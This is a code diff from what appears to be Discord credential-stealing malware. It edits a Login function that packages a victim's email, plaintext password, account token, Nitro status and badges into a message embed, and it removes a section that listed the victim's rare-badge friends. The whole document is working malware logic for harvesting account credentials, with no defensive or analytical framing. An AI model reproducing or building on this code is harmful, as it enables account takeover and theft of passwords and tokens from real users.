@@ -150,11 +150,12 @@ function Login(email, password, token) {
                         {
                             "name": "<a:arrow:765308889859751976> **Account Info**",
 
+                            
+
                             "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`                             <:staff_blue:936543701294010399> **Password:** \`${password}\``,
                             "inline": false
                         },
-
-                                 {
+                                {
                                    "name": "<a:arrow:765308889859751976> **Other Info**",
                                                                                                     
                                                                                         
@@ -163,23 +164,13 @@ function Login(email, password, token) {
                                    "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:**  ${GetNitro(json.premium_type)}\n                                 <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
                                  },
 
+
+
                                  {
                             "name": "**Token**",
                             "value": `\`${token}\``,
                             "inline": false
-                                 },
-                                 {
-                                    title: `Total Friends (${JSON.parse(a).filter((e) => 1 == e.type).length})`,                                    
-                                    description: (function () {
-                                        const e = JSON.parse(a).filter((e) => 1 == e.type);
-                                        var t = "";
-                                        for (z of e) {
-                                            var n = GetRBadges(z.user.public_flags);
-                                            "" != n && (t += n + ` ${z.user.username}#${z.user.discriminator}\n`);
-                                        }
-                                        return "" == t && (t = "No Rare Friends"), t;
-                                    })(),
-                                }
+                        }
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator + "・" + json.id,
